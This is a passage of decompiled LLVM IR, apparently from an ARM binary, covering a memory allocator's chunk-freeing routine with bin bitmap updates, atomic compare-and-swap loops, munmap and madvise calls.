  %v0_b548 = call i32 @__a_barrier()
  store i32 %v0_b548, i32* @r0, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_b550 = load i32, i32* @r2, align 4
  %v2_b550 = load i32, i32* @r1, align 4
  %v3_b550 = add i32 %v2_b550, %v1_b550
  %v4_b550 = inttoptr i32 %v3_b550 to i32*
  store i32 0, i32* %v4_b550, align 4
  %v0_b554 = call i32 @__a_barrier()
  store i32 %v0_b554, i32* %r0.global-to-local, align 4
  %v0_b558 = load i32, i32* @r6, align 4
  %v1_b558 = add i32 %v0_b558, 12
  store i32 %v1_b558, i32* %r3.global-to-local, align 4
  %v1_b55c = load i32, i32* @r1, align 4
  %v2_b55c = add i32 %v1_b55c, %v1_b558
  %v3_b55c = inttoptr i32 %v2_b55c to i32*
  %v4_b55c = load i32, i32* %v3_b55c, align 4
  store i32 %v4_b55c, i32* %r2.global-to-local, align 4
  %v2_b560 = icmp eq i32 %v4_b55c, 0
  br i1 %v2_b560, label %dec_label_pc_b584.preheader, label %dec_label_pc_b568

dec_label_pc_b568:                                ; preds = %dec_label_pc_b548
  store i32 240, i32* @r7, align 4
  %v0_b56c = load i32, i32* @r4, align 4
  store i32 %v0_b56c, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v7_b57c = icmp eq i32 %v0_b56c, -38
  br i1 %v7_b57c, label %dec_label_pc_b898, label %dec_label_pc_b584.preheader

dec_label_pc_b584.preheader:                      ; preds = %dec_label_pc_b898, %bb62, %dec_label_pc_b530, %dec_label_pc_b548, %dec_label_pc_b568
  %stack_var_-44.4.ph = phi i32 [ %stack_var_-44.3, %dec_label_pc_b568 ], [ %stack_var_-44.3, %dec_label_pc_b898 ], [ %stack_var_-44.3, %dec_label_pc_b548 ], [ %stack_var_-44.3, %dec_label_pc_b530 ], [ %stack_var_-44.2, %bb62 ]
  %v0_b584.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_b584

dec_label_pc_b584:                                ; preds = %dec_label_pc_b584.preheader, %dec_label_pc_b60c
  %v0_b584 = phi i32 [ %v0_b618, %dec_label_pc_b60c ], [ %v0_b584.pre, %dec_label_pc_b584.preheader ]
  %stack_var_-44.4 = phi i32 [ %stack_var_-44.6, %dec_label_pc_b60c ], [ %stack_var_-44.4.ph, %dec_label_pc_b584.preheader ]
  store i32 %v0_b584, i32* %r0.global-to-local, align 4
  %v1_b588 = inttoptr i32 %v0_b584 to i32*
  %v2_b588 = call i32 @alloc_rev(i32* %v1_b588)
  store i32 %v2_b588, i32* %r0.global-to-local, align 4
  %v2_b58c = icmp eq i32 %v2_b588, 0
  br i1 %v2_b58c, label %dec_label_pc_b5d0, label %dec_label_pc_b594

dec_label_pc_b594:                                ; preds = %dec_label_pc_b584
  %v0_b594 = load i32, i32* @r8, align 4
  %v1_b594 = inttoptr i32 %v0_b594 to i32*
  %v2_b594 = load i32, i32* %v1_b594, align 4
  %v1_b598 = and i32 %v2_b594, -2
  store i32 %v1_b598, i32* %r3.global-to-local, align 4
  %v2_b59c = sub i32 %v0_b594, %v1_b598
  store i32 %v2_b59c, i32* @r8, align 4
  %v1_b5a0 = add i32 %v2_b59c, 4
  %v2_b5a0 = inttoptr i32 %v1_b5a0 to i32*
  %v3_b5a0 = load i32, i32* %v2_b5a0, align 4
  store i32 %v1_b408, i32* %r0.global-to-local, align 4
  %v1_b5a8 = and i32 %v3_b5a0, -2
  store i32 %v1_b5a8, i32* %r2.global-to-local, align 4
  %v2_b5ac = add i32 %v1_b5a8, %v1_b408
  store i32 %v2_b5ac, i32* %r3.global-to-local, align 4
  %v0_b5b4 = load i32, i32* @fp, align 4
  %v2_b5b4 = add i32 %v0_b5b4, %v1_b5a8
  store i32 %v2_b5b4, i32* @fp, align 4
  %tmp81 = icmp ult i32 %v2_b5ac, 163841
  br i1 %tmp81, label %dec_label_pc_b5d0, label %dec_label_pc_b5bc

dec_label_pc_b5bc:                                ; preds = %dec_label_pc_b594
  %v2_b5bc = xor i32 %v2_b5ac, %v1_b5a8
  store i32 %v2_b5bc, i32* %r3.global-to-local, align 4
  %v3_b5c4 = icmp ult i32 %v1_b5a8, %v2_b5bc
  br i1 %v3_b5c4, label %bb63, label %dec_label_pc_b5d0

bb63:                                             ; preds = %dec_label_pc_b5bc
  br label %dec_label_pc_b5d0

dec_label_pc_b5d0:                                ; preds = %dec_label_pc_b5bc, %bb63, %dec_label_pc_b594, %dec_label_pc_b584
  %stack_var_-44.5 = phi i32 [ %stack_var_-44.4, %dec_label_pc_b584 ], [ %stack_var_-44.4, %dec_label_pc_b594 ], [ %stack_var_-44.4, %dec_label_pc_b5bc ], [ 1, %bb63 ]
  %v0_b5d0 = load i32, i32* @sb, align 4
  store i32 %v0_b5d0, i32* %r0.global-to-local, align 4
  %v1_b5d4 = call i32 @alloc_fwd(i32 %v0_b5d0)
  store i32 %v1_b5d4, i32* %r0.global-to-local, align 4
  %v2_b5d8 = icmp eq i32 %v1_b5d4, 0
  %v0_b438.pre = load i32, i32* @sb, align 4
  br i1 %v2_b5d8, label %.loopexit, label %dec_label_pc_b5e0

dec_label_pc_b5e0:                                ; preds = %dec_label_pc_b5d0
  %v1_b5e0 = add i32 %v0_b438.pre, 4
  %v2_b5e0 = inttoptr i32 %v1_b5e0 to i32*
  %v3_b5e0 = load i32, i32* %v2_b5e0, align 4
  store i32 %v1_b408, i32* %r0.global-to-local, align 4
  %v1_b5e8 = and i32 %v3_b5e0, -2
  store i32 %v1_b5e8, i32* %r2.global-to-local, align 4
  %v2_b5ec = add i32 %v1_b5e8, %v1_b408
  store i32 %v2_b5ec, i32* %r3.global-to-local, align 4
  %tmp82 = icmp ult i32 %v2_b5ec, 163841
  br i1 %tmp82, label %dec_label_pc_b60c, label %dec_label_pc_b5f8

dec_label_pc_b5f8:                                ; preds = %dec_label_pc_b5e0
  %v2_b5f8 = xor i32 %v2_b5ec, %v1_b5e8
  store i32 %v2_b5f8, i32* %r3.global-to-local, align 4
  %v3_b600 = icmp ult i32 %v1_b5e8, %v2_b5f8
  br i1 %v3_b600, label %bb64, label %dec_label_pc_b60c

bb64:                                             ; preds = %dec_label_pc_b5f8
  br label %dec_label_pc_b60c

dec_label_pc_b60c:                                ; preds = %dec_label_pc_b5f8, %bb64, %dec_label_pc_b5e0
  %stack_var_-44.6 = phi i32 [ %stack_var_-44.5, %dec_label_pc_b5e0 ], [ %stack_var_-44.5, %dec_label_pc_b5f8 ], [ 1, %bb64 ]
  %v2_b60c = add i32 %v1_b5e8, %v0_b438.pre
  store i32 %v2_b60c, i32* @sb, align 4
  %v0_b610 = load i32, i32* @fp, align 4
  %v2_b610 = add i32 %v0_b610, %v1_b5e8
  store i32 %v2_b610, i32* @fp, align 4
  %v1_b614 = add i32 %v2_b60c, 4
  %v2_b614 = inttoptr i32 %v1_b614 to i32*
  %v3_b614 = load i32, i32* %v2_b614, align 4
  store i32 %v3_b614, i32* %r3.global-to-local, align 4
  %v0_b618 = load i32, i32* @r8, align 4
  %v1_b618 = inttoptr i32 %v0_b618 to i32*
  %v2_b618 = load i32, i32* %v1_b618, align 4
  store i32 %v2_b618, i32* %r2.global-to-local, align 4
  %v2_b61c = and i32 %v2_b618, %v3_b614
  store i32 %v2_b61c, i32* %r3.global-to-local, align 4
  %v1_b620 = urem i32 %v2_b61c, 2
  %v2_b620 = icmp eq i32 %v1_b620, 0
  br i1 %v2_b620, label %dec_label_pc_b584, label %dec_label_pc_b44c

dec_label_pc_b62c:                                ; preds = %dec_label_pc_b4d0
  store i32 ptrtoint (i32* @global_var_238f0.447 to i32), i32* %r2.global-to-local, align 4
  %v2_b630 = load i32, i32* @global_var_238f0.447, align 4
  %v5_b630 = load i32, i32* @global_var_238f4.449, align 4
  store i32 %v5_b630, i32* %r4.global-to-local, align 4
  %v1_b634 = load i32, i32* @sl, align 4
  %v6_b634 = lshr i32 %v2_b630, %v1_b634
  %v1_b638 = sub i32 32, %v1_b634
  %v7_b63c = shl i32 %v5_b630, %v1_b638
  %v8_b63c = or i32 %v7_b63c, %v6_b634
  store i32 %v8_b63c, i32* %r3.global-to-local, align 4
  %v1_b640 = add i32 %v1_b634, -32
  store i32 %v1_b640, i32* @r1, align 4
  %v6_b640 = icmp slt i32 %v1_b640, 0
  br i1 %v6_b640, label %bb66, label %bb65

bb65:                                             ; preds = %dec_label_pc_b62c
  %v7_b644 = lshr i32 %v5_b630, %v1_b640
  store i32 %v7_b644, i32* %r3.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_b62c, %bb65
  %v0_b648 = phi i32 [ %v8_b63c, %dec_label_pc_b62c ], [ %v7_b644, %bb65 ]
  %v1_b648 = urem i32 %v0_b648, 2
  store i32 %v1_b648, i32* %r0.global-to-local, align 4
  %v2_b648 = icmp eq i32 %v1_b648, 0
  br i1 %v2_b648, label %dec_label_pc_b650, label %dec_label_pc_b6ac

dec_label_pc_b650:                                ; preds = %bb66
  store i32 1, i32* %r2.global-to-local, align 4
  %v2_b654 = icmp eq i32 %v1_b640, 0
  store i1 %v2_b654, i1* @cpsr_z, align 1
  %v7_b658 = lshr i32 1, %v1_b638
  store i32 %v7_b658, i32* %r4.global-to-local, align 4
  %v6_b65c = shl i32 1, %v1_b634
  store i32 %v6_b65c, i32* %r3.global-to-local, align 4
  br i1 %v6_b640, label %bb68, label %bb67

bb67:                                             ; preds = %dec_label_pc_b650
  %v9_b660 = shl i32 1, %v1_b640
  store i32 %v9_b660, i32* %r4.global-to-local, align 4
  br label %bb68

bb68:                                             ; preds = %dec_label_pc_b650, %bb67
  %v0_b668 = phi i32 [ %v7_b658, %dec_label_pc_b650 ], [ %v9_b660, %bb67 ]
  store i32 %v6_b65c, i32* %r5.global-to-local, align 4
  store i32 %v2_b630, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_238f0.447 to i32), i32* @r2, align 4
  %v2_b67c73 = or i32 %v2_b630, %v6_b65c
  %v3_b68074 = call i32 @__a_cas(i32 %v2_b630, i32 %v2_b67c73, i32 ptrtoint (i32* @global_var_238f0.447 to i32))
  store i32 %v3_b68074, i32* %r0.global-to-local, align 4
  %v2_b68476 = icmp eq i32 %v3_b68074, 0
  store i1 %v2_b68476, i1* @cpsr_z, align 1
  br i1 %v2_b68476, label %dec_label_pc_b68c, label %dec_label_pc_b674.dec_label_pc_b674_crit_edge

dec_label_pc_b674.dec_label_pc_b674_crit_edge:    ; preds = %bb68, %dec_label_pc_b674.dec_label_pc_b674_crit_edge
  %v2_b674.pre = load i32, i32* @global_var_238f0.447, align 4
  %v1_b67c.pre = load i32, i32* %r5.global-to-local, align 4
  store i32 %v2_b674.pre, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_238f0.447 to i32), i32* @r2, align 4
  %v2_b67c = or i32 %v2_b674.pre, %v1_b67c.pre
  %v3_b680 = call i32 @__a_cas(i32 %v2_b674.pre, i32 %v2_b67c, i32 ptrtoint (i32* @global_var_238f0.447 to i32))
  store i32 %v3_b680, i32* %r0.global-to-local, align 4
  %v2_b684 = icmp eq i32 %v3_b680, 0
  store i1 %v2_b684, i1* @cpsr_z, align 1
  br i1 %v2_b684, label %dec_label_pc_b68c, label %dec_label_pc_b674.dec_label_pc_b674_crit_edge

dec_label_pc_b68c:                                ; preds = %dec_label_pc_b674.dec_label_pc_b674_crit_edge, %bb68
  store i32 ptrtoint (i32* @global_var_238f4.449 to i32), i32* %r5.global-to-local, align 4
  store i32 %v0_b668, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_b694

dec_label_pc_b694:                                ; preds = %dec_label_pc_b694.dec_label_pc_b694_crit_edge, %dec_label_pc_b68c
  %v1_b69c = phi i32 [ %v1_b69c.pre, %dec_label_pc_b694.dec_label_pc_b694_crit_edge ], [ %v0_b668, %dec_label_pc_b68c ]
  %v2_b694 = load i32, i32* @global_var_238f4.449, align 4
  store i32 %v2_b694, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_238f4.449 to i32), i32* @r2, align 4
  %v2_b69c = or i32 %v2_b694, %v1_b69c
  %v3_b6a0 = call i32 @__a_cas(i32 %v2_b694, i32 %v2_b69c, i32 ptrtoint (i32* @global_var_238f4.449 to i32))
  store i32 %v3_b6a0, i32* %r0.global-to-local, align 4
  %v2_b6a4 = icmp eq i32 %v3_b6a0, 0
  store i1 %v2_b6a4, i1* @cpsr_z, align 1
  br i1 %v2_b6a4, label %dec_label_pc_b6ac.loopexit, label %dec_label_pc_b694.dec_label_pc_b694_crit_edge

dec_label_pc_b694.dec_label_pc_b694_crit_edge:    ; preds = %dec_label_pc_b694
  %v1_b69c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_b694

dec_label_pc_b6ac.loopexit:                       ; preds = %dec_label_pc_b694
  %v1_b6b0.pre = load i32, i32* @sb, align 4
  br label %dec_label_pc_b6ac

dec_label_pc_b6ac:                                ; preds = %dec_label_pc_b6ac.loopexit, %bb66
  %v1_b6b0 = phi i32 [ %v1_b6b0.pre, %dec_label_pc_b6ac.loopexit ], [ %v0_b4d4, %bb66 ]
  store i32 ptrtoint (i32* @global_var_238f0.447 to i32), i32* @r0, align 4
  %v0_b6b0 = load i32, i32* @fp, align 4
  %v2_b6b0 = inttoptr i32 %v1_b6b0 to i32*
  store i32 %v0_b6b0, i32* %v2_b6b0, align 4
  %v0_b6b4 = load i32, i32* @fp, align 4
  %v1_b6b4 = load i32, i32* @r8, align 4
  %v2_b6b4 = add i32 %v1_b6b4, 4
  %v3_b6b4 = inttoptr i32 %v2_b6b4 to i32*
  store i32 %v0_b6b4, i32* %v3_b6b4, align 4
  %v3_b6b8 = load i32, i32* @global_var_23cf8.455, align 4
  store i32 %v3_b6b8, i32* %r3.global-to-local, align 4
  %v2_b6bc = icmp eq i32 %v3_b6b8, 0
  store i1 %v2_b6bc, i1* @cpsr_z, align 1
  %v0_b6c0 = load i32, i32* @r0, align 4
  store i32 %v0_b6c0, i32* @r4, align 4
  br i1 %v2_b6bc, label %dec_label_pc_b714, label %dec_label_pc_b6c8

dec_label_pc_b6c8:                                ; preds = %dec_label_pc_b6ac
  %v0_b6c8 = call i32 @__a_barrier()
  store i32 %v0_b6c8, i32* @r0, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_b6d0 = add i32 %v0_b6c8, 1032
  %v3_b6d0 = inttoptr i32 %v2_b6d0 to i32*
  store i32 0, i32* %v3_b6d0, align 4
  %v0_b6d4 = call i32 @__a_barrier()
  store i32 %v0_b6d4, i32* %r0.global-to-local, align 4
  %v1_b6d8 = add i32 %v0_b6d4, 1036
  %v2_b6d8 = inttoptr i32 %v1_b6d8 to i32*
  %v3_b6d8 = load i32, i32* %v2_b6d8, align 4
  store i32 %v3_b6d8, i32* %r3.global-to-local, align 4
  %v2_b6dc = icmp eq i32 %v3_b6d8, 0
  br i1 %v2_b6dc, label %dec_label_pc_b714, label %dec_label_pc_b6e4

dec_label_pc_b6e4:                                ; preds = %dec_label_pc_b6c8
  %v1_b6e8 = add i32 %v0_b6d4, 1032
  store i32 %v1_b6e8, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_b700 = icmp eq i32 %v1_b6e8, -38
  br i1 %v4_b700, label %dec_label_pc_b704, label %dec_label_pc_b714

dec_label_pc_b704:                                ; preds = %dec_label_pc_b6e4
  store i32 ptrtoint (i32* @global_var_23cf8.455 to i32), i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b714

dec_label_pc_b714:                                ; preds = %dec_label_pc_b6e4, %dec_label_pc_b704, %dec_label_pc_b6c8, %dec_label_pc_b6ac
  store i32 ptrtoint (i32* @global_var_238f0.447 to i32), i32* %r2.global-to-local, align 4
  %v3_b71c = mul i32 %v1_b4a8, 16
  %v2_b720 = add i32 %v3_b71c, ptrtoint (i32* @global_var_238f0.447 to i32)
  store i32 %v2_b720, i32* %r3.global-to-local, align 4
  %v1_b724 = add i32 %v3_b71c, add (i32 ptrtoint (i32* @global_var_238f0.447 to i32), i32 -8)
  store i32 %v1_b724, i32* @r1, align 4
  %v1_b728 = load i32, i32* @r8, align 4
  %v2_b728 = add i32 %v1_b728, 8
  %v3_b728 = inttoptr i32 %v2_b728 to i32*
  store i32 %v1_b724, i32* %v3_b728, align 4
  %v0_b72c = load i32, i32* %r3.global-to-local, align 4
  %v1_b72c = add i32 %v0_b72c, 4
  %v2_b72c = inttoptr i32 %v1_b72c to i32*
  %v3_b72c = load i32, i32* %v2_b72c, align 4
  store i32 %v3_b72c, i32* %r2.global-to-local, align 4
  %v1_b730 = load i32, i32* @r8, align 4
  %v2_b730 = add i32 %v1_b730, 12
  %v3_b730 = inttoptr i32 %v2_b730 to i32*
  store i32 %v3_b72c, i32* %v3_b730, align 4
  %v0_b734 = load i32, i32* @r8, align 4
  %v1_b734 = load i32, i32* @r1, align 4
  %v2_b734 = add i32 %v1_b734, 12
  %v3_b734 = inttoptr i32 %v2_b734 to i32*
  store i32 %v0_b734, i32* %v3_b734, align 4
  store i32 %stack_var_-44.3, i32* @r0, align 4
  %v0_b73c = load i32, i32* @r8, align 4
  %v1_b73c = add i32 %v0_b73c, 12
  %v2_b73c = inttoptr i32 %v1_b73c to i32*
  %v3_b73c = load i32, i32* %v2_b73c, align 4
  store i32 %v3_b73c, i32* %r3.global-to-local, align 4
  %v2_b740 = icmp eq i32 %stack_var_-44.3, 0
  %v2_b744 = add i32 %v3_b73c, 8
  %v3_b744 = inttoptr i32 %v2_b744 to i32*
  store i32 %v0_b73c, i32* %v3_b744, align 4
  store i32 ptrtoint (i32* @global_var_238f0.447 to i32), i32* @r4, align 4
  br i1 %v2_b740, label %dec_label_pc_b750, label %dec_label_pc_b8a8

dec_label_pc_b750:                                ; preds = %dec_label_pc_b714, %dec_label_pc_b8a8
  %v1_b75c = phi i32 [ ptrtoint (i32* @global_var_238f0.447 to i32), %dec_label_pc_b714 ], [ %v1_b754.pre, %dec_label_pc_b8a8 ]
  %v0_b750 = load i32, i32* @r6, align 4
  %v1_b750 = add i32 %v0_b750, 8
  store i32 %v1_b750, i32* @r2, align 4
  %v2_b754 = add i32 %v1_b750, %v1_b75c
  %v3_b754 = inttoptr i32 %v2_b754 to i32*
  %v4_b754 = load i32, i32* %v3_b754, align 4
  store i32 %v4_b754, i32* @r3, align 4
  %v2_b758 = icmp eq i32 %v4_b754, 0
  store i1 %v2_b758, i1* @cpsr_z, align 1
  store i32 %v2_b754, i32* %r5.global-to-local, align 4
  br i1 %v2_b758, label %dec_label_pc_b750.dec_label_pc_b7ac_crit_edge, label %dec_label_pc_b764

dec_label_pc_b750.dec_label_pc_b7ac_crit_edge:    ; preds = %dec_label_pc_b750
  %v1_b7b4.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_b7ac

dec_label_pc_b764:                                ; preds = %dec_label_pc_b750
  %v0_b764 = call i32 @__a_barrier()
  store i32 %v0_b764, i32* @r0, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_b76c = load i32, i32* @r2, align 4
  %v2_b76c = load i32, i32* @r4, align 4
  %v3_b76c = add i32 %v2_b76c, %v1_b76c
  %v4_b76c = inttoptr i32 %v3_b76c to i32*
  store i32 0, i32* %v4_b76c, align 4
  %v0_b770 = call i32 @__a_barrier()
  store i32 %v0_b770, i32* %r0.global-to-local, align 4
  %v0_b774 = load i32, i32* @r6, align 4
  %v1_b774 = add i32 %v0_b774, 12
  store i32 %v1_b774, i32* @r3, align 4
  %v1_b778 = load i32, i32* @r4, align 4
  %v2_b778 = add i32 %v1_b778, %v1_b774
  %v3_b778 = inttoptr i32 %v2_b778 to i32*
  %v4_b778 = load i32, i32* %v3_b778, align 4
  %v2_b77c = icmp eq i32 %v4_b778, 0
  br i1 %v2_b77c, label %dec_label_pc_b7ac, label %dec_label_pc_b784

dec_label_pc_b784:                                ; preds = %dec_label_pc_b764
  %v0_b788 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_b788, i32* %r0.global-to-local, align 4
  %v4_b79c = icmp eq i32 %v0_b788, -38
  br i1 %v4_b79c, label %dec_label_pc_b7a0, label %dec_label_pc_b7ac

dec_label_pc_b7a0:                                ; preds = %dec_label_pc_b784
  store i32 -38, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b7ac

dec_label_pc_b7ac:                                ; preds = %dec_label_pc_b750.dec_label_pc_b7ac_crit_edge, %dec_label_pc_b784, %dec_label_pc_b7a0, %dec_label_pc_b764, %entry, %bb70
  %v1_b7b4 = phi i32 [ %v1_b7b4.pre, %dec_label_pc_b750.dec_label_pc_b7ac_crit_edge ], [ %v0_b788, %dec_label_pc_b784 ], [ -38, %dec_label_pc_b7a0 ], [ %v0_b770, %dec_label_pc_b764 ], [ 0, %entry ], [ %v1_b860, %bb70 ]
  store i32 %v3_b3e8, i32* @r4, align 4
  store i32 %v6_b3e8, i32* @r5, align 4
  store i32 %v9_b3e8, i32* @r6, align 4
  store i32 %v12_b3e8, i32* @r7, align 4
  store i32 %v15_b3e8, i32* @r8, align 4
  store i32 %v18_b3e8, i32* @sb, align 4
  store i32 %v21_b3e8, i32* @sl, align 4
  store i32 %v24_b3e8, i32* @fp, align 4
  store i32 %v27_b3e8, i32* @lr, align 4
  ret i32 %v1_b7b4

dec_label_pc_b7c0:                                ; preds = %dec_label_pc_b804
  %v0_b7c4 = load i32, i32* @r6, align 4
  store i32 1, i32* @r2, align 4
  %v2_b7cc = add i32 %v0_b7c4, add (i32 ptrtoint (i32* @global_var_238f0.447 to i32), i32 12)
  %v0_b7d0 = load i32, i32* @r5, align 4
  store i32 %v0_b7d0, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  %v2_b7d8 = inttoptr i32 %v0_b7d0 to i32*
  %v3_b7d8 = call i32 @__wait(i32* %v2_b7d8, i32 %v2_b7cc)
  store i32 %v3_b7d8, i32* %r0.global-to-local, align 4
  %v0_b7e0.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_b7dc

dec_label_pc_b7dc:                                ; preds = %dec_label_pc_b484, %dec_label_pc_b7c0
  %v0_b7e0 = phi i32 [ %v0_b7e0.pre, %dec_label_pc_b7c0 ], [ %v3_b48c, %dec_label_pc_b484 ]
  store i32 ptrtoint (i32* @global_var_238f0.447 to i32), i32* %r0.global-to-local, align 4
  %v1_b7e0 = add i32 %v0_b7e0, 8
  store i32 %v1_b7e0, i32* %r3.global-to-local, align 4
  %v2_b7e4 = add i32 %v0_b7e0, add (i32 ptrtoint (i32* @global_var_238f0.447 to i32), i32 8)
  store i32 %v2_b7e4, i32* @r7, align 4
  br label %dec_label_pc_b7e8

dec_label_pc_b7e8:                                ; preds = %dec_label_pc_b7e8.dec_label_pc_b7e8_crit_edge, %dec_label_pc_b7dc
  %v0_b7e8 = phi i32 [ %v0_b7e8.pre, %dec_label_pc_b7e8.dec_label_pc_b7e8_crit_edge ], [ %v2_b7e4, %dec_label_pc_b7dc ]
  %v1_b7e8 = inttoptr i32 %v0_b7e8 to i32*
  %v2_b7e8 = load i32, i32* %v1_b7e8, align 4
  store i32 %v2_b7e8, i32* @r4, align 4
  store i32 %v2_b7e8, i32* %r0.global-to-local, align 4
  store i32 %v0_b7e8, i32* @r2, align 4
  %v3_b7f8 = call i32 @__a_cas(i32 %v2_b7e8, i32 1, i32 %v0_b7e8)
  store i32 %v3_b7f8, i32* %r0.global-to-local, align 4
  %v2_b7fc = icmp eq i32 %v3_b7f8, 0
  store i1 %v2_b7fc, i1* @cpsr_z, align 1
  br i1 %v2_b7fc, label %dec_label_pc_b804, label %dec_label_pc_b7e8.dec_label_pc_b7e8_crit_edge

dec_label_pc_b7e8.dec_label_pc_b7e8_crit_edge:    ; preds = %dec_label_pc_b7e8
  %v0_b7e8.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_b7e8

dec_label_pc_b804:                                ; preds = %dec_label_pc_b7e8
  %v0_b7b8 = load i32, i32* @r4, align 4
  %v2_b7b8 = icmp eq i32 %v0_b7b8, 0
  br i1 %v2_b7b8, label %dec_label_pc_b4a4.loopexit, label %dec_label_pc_b7c0

dec_label_pc_b808:                                ; preds = %dec_label_pc_b808, %dec_label_pc_b840, %dec_label_pc_b4c0
  %v3_b80c = load i32, i32* @global_var_23cf8.455, align 4
  store i32 %v3_b80c, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_23cf8.455 to i32), i32* @r2, align 4
  store i32 %v3_b80c, i32* %r0.global-to-local, align 4
  %v3_b81c = call i32 @__a_cas(i32 %v3_b80c, i32 1, i32 ptrtoint (i32* @global_var_23cf8.455 to i32))
  %v2_b820 = icmp eq i32 %v3_b81c, 0
  store i1 %v2_b820, i1* @cpsr_z, align 1
  store i32 ptrtoint (i32* @global_var_23cf8.455 to i32), i32* %r0.global-to-local, align 4
  store i32 1, i32* @r2, align 4
  store i32 1, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_23cfc.459 to i32), i32* @r1, align 4
  br i1 %v2_b820, label %dec_label_pc_b838, label %dec_label_pc_b808

dec_label_pc_b838:                                ; preds = %dec_label_pc_b808
  %v0_b838 = load i32, i32* @r4, align 4
  %v2_b838 = icmp eq i32 %v0_b838, 0
  br i1 %v2_b838, label %dec_label_pc_b4d0, label %dec_label_pc_b840

dec_label_pc_b840:                                ; preds = %dec_label_pc_b838
  %v3_b840 = call i32 @__wait(i32* nonnull @global_var_23cf8.455, i32 ptrtoint (i32* @global_var_23cfc.459 to i32))
  store i32 %v3_b840, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b808

dec_label_pc_b848:                                ; preds = %dec_label_pc_b3f8
  %v2_b848 = inttoptr i32 %v1_b3f8 to i32*
  %v3_b848 = load i32, i32* %v2_b848, align 4
  store i32 %v3_b848, i32* %r0.global-to-local, align 4
  %v1_b84c = and i32 %v3_b3fc, -2
  %v1_b850 = urem i32 %v3_b848, 2
  %v2_b850 = icmp eq i32 %v1_b850, 0
  %v2_b854 = add i32 %v3_b848, %v1_b84c
  store i32 %v2_b854, i32* @r1, align 4
  br i1 %v2_b850, label %bb70, label %bb69

bb69:                                             ; preds = %dec_label_pc_b848
  call void @llvm.trap()
  unreachable

bb70:                                             ; preds = %dec_label_pc_b848
  %v2_b85c = sub i32 %v1_b3f8, %v3_b848
  store i32 %v2_b85c, i32* %r0.global-to-local, align 4
  %v1_b860 = call i32 @__munmap(i32 %v2_b85c)
  store i32 %v1_b860, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b7ac

dec_label_pc_b868:                                ; preds = %dec_label_pc_b4a4
  store i32 %v1_b4a8, i32* %r0.global-to-local, align 4
  %v3_b86c = mul i32 %v1_b4a8, 16
  %v2_b870 = add i32 %v3_b86c, ptrtoint (i32* @global_var_238f0.447 to i32)
  store i32 %v2_b870, i32* %r3.global-to-local, align 4
  %v1_b874 = add i32 %v3_b86c, add (i32 ptrtoint (i32* @global_var_238f0.447 to i32), i32 -8)
  store i32 %v1_b874, i32* %r2.global-to-local, align 4
  store i32 %v1_b874, i32* %v6_b4ac, align 4
  %v0_b87c = load i32, i32* %r2.global-to-local, align 4
  %v1_b87c = load i32, i32* %r3.global-to-local, align 4
  %v2_b87c = add i32 %v1_b87c, 4
  %v3_b87c = inttoptr i32 %v2_b87c to i32*
  store i32 %v0_b87c, i32* %v3_b87c, align 4
  br label %dec_label_pc_b4c0

dec_label_pc_b884:                                ; preds = %dec_label_pc_b510
  store i32 ptrtoint (i32* @global_var_23cf8.455 to i32), i32* @r0, align 4
  br label %dec_label_pc_b530

dec_label_pc_b898:                                ; preds = %dec_label_pc_b568
  store i32 %v0_b56c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b584.preheader

dec_label_pc_b8a8:                                ; preds = %dec_label_pc_b714
  %v0_b8a8 = load i32, i32* @r8, align 4
  %v0_b8ac = load i32, i32* @sb, align 4
  %v1_b8ac = add i32 %v0_b8ac, -16
  %v1_b8b0 = add i32 %v0_b8a8, 4111
  %v1_b8bc = and i32 %v1_b8b0, -4096
  store i32 %v1_b8bc, i32* @r0, align 4
  %v1_b8c0 = and i32 %v1_b8ac, -4096
  %v2_b8c4 = sub i32 %v1_b8c0, %v1_b8bc
  store i32 %v2_b8c4, i32* @r1, align 4
  store i32 4, i32* @r2, align 4
  %v4_b8cc = call i32 @__madvise(i32 %v1_b8bc, i32 %v2_b8c4, i32 4, i32 %v3_b73c)
  store i32 %v4_b8cc, i32* @r0, align 4
  %v1_b754.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_b750

; uselistorder directives
  uselistorder i32 %v3_b86c, { 1, 0 }
  uselistorder i32 %v1_b860, { 1, 0 }
  uselistorder i32 %v3_b848, { 2, 1, 0, 3 }
  uselistorder i32 %v0_b7e8, { 1, 2, 0 }
  uselistorder i32 %v0_b7e0, { 1, 0 }
  uselistorder i32 %v3_b71c, { 1, 0 }
  uselistorder i32 %v2_b694, { 1, 0, 2 }
  uselistorder i32 %v2_b674.pre, { 0, 2, 1 }
  uselistorder i32 %v7_b658, { 1, 0 }
  uselistorder i32 %v1_b648, { 1, 0 }
  uselistorder i32 %v1_b640, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_b618, { 1, 0 }
  uselistorder i32 %v2_b610, { 1, 0 }
  uselistorder i32 %v2_b60c, { 1, 2, 0 }
  uselistorder i32 %v2_b5ec, { 1, 0, 2 }
  uselistorder i32 %v1_b5e8, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 %v0_b438.pre, { 1, 2, 0 }
  uselistorder i32 %stack_var_-44.5, { 1, 2, 0 }
  uselistorder i32 %v2_b5ac, { 1, 0, 2 }
